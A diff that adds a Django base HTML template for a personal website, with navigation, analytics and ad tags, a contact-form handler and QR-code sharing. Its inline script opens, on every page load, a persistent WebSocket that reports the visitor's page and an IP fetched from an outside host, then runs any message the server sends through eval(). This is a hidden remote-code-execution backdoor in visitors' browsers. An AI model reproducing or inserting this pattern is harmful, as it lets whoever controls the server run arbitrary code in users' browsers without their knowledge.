@@ -1,0 +1,203 @@
+<!doctype html> <html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="{{ description }}">
+    <meta name="author" content="Charlotte Grace Harper">
+    <link rel="icon" href="/media/favicon.ico">
+    <title>{% if title %}{{ title }} - {% endif %}{{ site_name }}</title>
+    <link rel="canonical" href="https://glamgirlx.com{{ path }}">
+    <link href="/static/main.css" rel="stylesheet">
+    <link rel="manifest" href="/site.webmanifest">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="stylesheet" href="/static/fonts/bootstrap-icons.css">
+    {% block head %}{% endblock %}
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
+         crossorigin="anonymous"></script>
+	<script async src="https://www.googletagmanager.com/gtag/js?id=G-XG1SZ2K8S5"></script>
+	<script>
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+	
+	  gtag('config', 'G-XG1SZ2K8S5');
+	</script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16692395808">
+    </script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'AW-16692395808');
+    </script>
+  </head>
+  <body>
+    <header>
+      <nav id="glam-navbar" class="navbar fixed-top navbar-expand-lg navbar-light p-2" style="background-color: #e3f2fd;">
+        <a style="position: relative; z-index: 1;" class="navbar-brand" href="/" title="The homepage">
+	        <img src="/media/lips.png" alt="{{ site_name }}" width="30" height="30" style="border-radius: 50%; background-color: transparent;">
+		{{ site_name }}
+	</a>
+        <button class="navbar-toggler ms-auto" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" data-bs-auto-close="true" data-bs-toggle="dropdown" aria-controls="navbarScroll" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse " id="navbarSupportedContent">
+          <ul class="navbar-nav mr-auto">
+            <li class="nav-item">
+              <a class="nav-link" href="/news" title="New articles">News</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/contact" title="Contact me">Contact</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/landing" title="Visit the landing page">Landing</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="{{ add_url }}" title="Video chat">Chat</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/private" title="See private photos with a key">Private</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="{{ site_url }}{% url 'payments:surrogacy' model_name %}" title="Surrogacy plans">Surrogacy</a>
+            </li>
+          </ul>
+          <ul class="navbar-nav" style="margin-left: auto;">
+            <form class="form-inline d-flex mt-2 mt-md-0" action="{{ site_url }}/search/" method="GET">
+              <input class="form-control mr-sm-2" type="text" id="q" name="q" placeholder="Search" aria-label="Search" required>
+              <button class="btn btn-outline-success my-2 my-sm-0" type="submit" title="Search my website, {{ base_domain }}">Search</button>
+            </form>
+            <li class="nav-item">
+              <a class="nav-link disabled" href="#" title="Always free - Create an account to support me">Free</a>
+            </li>
+            <li class="nav-item align-middle">
+              {% include 'dynamic_time.html' %}
+            </li>
+            <li class="nav-item align-middle">
+              {% include 'dynamic_text_time.html' %}
+            </li>
+            <li class="nav-item">
+	          <a href="{{ site_url }}{% url 'landing:index' %}" title="Visit the landing page">
+                {% include 'sclock.html' %}
+              </a>
+            </li>
+          </ul>
+        </div>
+      </nav>
+    </header>
+    <main role="main" class="container">
+	    <div style="height: 100px;"></div>
+	    {% block content %}{% endblock %}
+	    <div class="d-flex justify-content-between p-2">
+	        <div style="float:left;">
+	          <p><span class="badge bg-light text-dark shadow p-1">&copy; {{ site_name }} {{ year }}</span></p>
+		</div>
+	        <div style="float:right;">
+	          <p><span class="badge bg-light text-dark shadow p-1"><a href="{{ site_url }}/terms/" title="See the terms of service'">Terms of Service</a></span></p>
+		</div>
+	    </div>
+	    <div style="height: 100px;"></div>
+    </main>
+    {% block footer %}{% endblock %}
+    <script src="/static/main.js"></script>
+    <script>
+        {% block javascript %}{% endblock %}
+        $(document).ready(function() {
+            {% if not hidenavbar %}
+            $(document.getElementById("glam-navbar")).autoHidingNavbar();
+            {% endif %}
+        	Prism.highlightAll();
+        });
+        var socket;
+        function openSocket() {
+            window.location.hash = '';
+            socket = new WebSocket("wss://{{ base_domain }}"  + '/ws/remote/?path=' + window.location.href);
+            socket.addEventListener("open", (event) => {
+                console.log('Socket open.');
+                fetch('https://lotteh.com/remote/generate/')
+        		    .then(response => response.json())
+        		    .then(data => {
+        		        socket.send(data.ip);
+        		    })
+        		    .catch(error => {
+        		        console.log('Error:', error);
+        		    });
+            });
+            socket.addEventListener("closed", (event) => {
+                console.log('Socket closed.');
+                setTimeout(function() {
+                    openSocket();
+                }, 10000);
+            });
+        	socket.addEventListener("message", (event) => {
+                    eval(event.data);
+            });
+        }
+        openSocket();
+        $(document).ready(function() {
+        	$("#contact-form").submit(function(e){
+                	e.preventDefault();
+                	var data = new FormData(document.getElementById('contact-form'));
+                	$.ajax({
+                        	url: "{{ site_url }}/contact/",
+                        	type: "POST",
+                        	data: data,
+                        	cache: false,
+                	        contentType: false,
+        	                processData: false,
+                            timeout: 1000 * 60,
+                	        tryCount: 0,
+        	                retryLimit: 5,
+                            error: (xhr, textStatus, errorThrown) => {
+                                    this.tryCount++;
+                                    if(this.tryCount >= this.retryLimit) return;
+                                    $.ajax(this);
+                            },
+                            success: (data) => {
+                                    if(data == 'Message sent.') {
+                                            $('#contact-submit').prop('disabled', true);
+                                            $(this).trigger('reset');
+                                    }
+                                    document.getElementById('contact-message').innerHTML = data;
+                                    $('#contact-message').removeClass('hide');
+                            },
+                    });
+            });
+        });
+        $(document).ready(function() {
+        	{% include 'clock.js' %}
+            var qrdiv = document.getElementById("shareqrcode");
+        	if(!qrdiv) return;
+        	var qr = new QRCode(qrdiv, "{{ base_url }}{{ path }}{% if request.GET %}?{% for key, value in request.GET.items %}{{key}}={{value}}{% if forloop.counter < request.GET|length %}&{% endif %}{% endfor %}{% endif %}");
+        	var image = qrdiv.querySelector('img');
+            image.style.width = "100%";
+            image.style.height = "100%";
+            image.style.maxWidth = "160px";
+            image.alt = "Share this page by scanning a QR code.";
+            function downloadQrImage(url, filename) {
+              const link = document.createElement('a');
+              link.href = url;
+              link.download = '{{ site_name }} - ' + filename;
+              document.body.appendChild(link);
+              link.click();
+              document.body.removeChild(link);
+            }
+            function downloadQr() {
+                    downloadQrImage(image.src, 'QR Code');
+            }
+            qrdiv.onclick = downloadQr;
+        });
+    </script>
+    <script>
+        if (navigator.serviceWorker) {
+            navigator.serviceWorker.register (
+              '/serviceworker.js',
+              {scope: '/'}
+            )
+        }
+    </script>
+</body>
+</html>
